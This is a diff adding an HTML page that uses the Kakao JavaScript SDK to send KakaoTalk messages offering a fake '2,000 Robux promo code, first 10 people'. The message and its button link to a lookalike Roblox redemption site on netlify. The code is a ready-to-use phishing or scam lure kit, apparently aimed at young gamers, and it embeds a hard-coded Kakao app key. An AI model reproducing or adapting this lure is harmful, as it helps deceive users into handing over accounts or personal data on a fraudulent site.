@@ -1,0 +1,42 @@
+<html>
+<head>
+<title>카카오톡 버튼있는 메시지 전송하기</title>
+<script id="javascript-sdk" src="https://developers.kakao.com/sdk/js/kakao.min.js"></script>
+</head>
+<body>
+<a id="kakao-link-btn" href="javascript:sendLink()">
+  <img
+    src="https://developers.kakao.com/assets/img/about/logos/kakaolink/kakaolink_btn_medium.png"
+  />
+</a>
+<script type="text/javascript">
+ Kakao.init('8ba2a1893fa8299fb5b4cebee8aa069c');
+  function sendLink() {
+    Kakao.Link.sendDefault({
+      objectType: 'feed',
+      content: {
+        title: '2,000로벅스 프로모션코드 [10명 선착순]',
+        description: '🔽 선착순 2,000 로벅스 얻기! 🔽',
+        imageUrl:
+          'https://www.cjs-cdkeys.com/product_images/img/u/10771598999602__62754.jpeg',
+        link: {
+          mobileWebUrl: 'https://kr-roblx-redeemcode-482793.netlify.app',
+          webUrl:  'https://kr-roblx-redeemcode-482793.netlify.app',
+        },
+      },
+      buttons: [
+        {
+          title: '이벤트 참여',
+          link: {
+            mobileWebUrl: 'https://kr-roblx-redeemcode-482793.netlify.app',
+            webUrl: 'https://kr-roblx-redeemcode-482793.netlify.app',
+          },
+        },
+      ],
+    })
+  }
+</script>
+<!-- www.blackcats4567.com -->
+<!-- 이미지/버튼 클릭 시 주소는 Kakao Developers의 애플리케이션 > 플랫폼 > Web에 넣어야 클릭했을때 성공적으로 표시됩니다 -->
+  </body>
+</html>
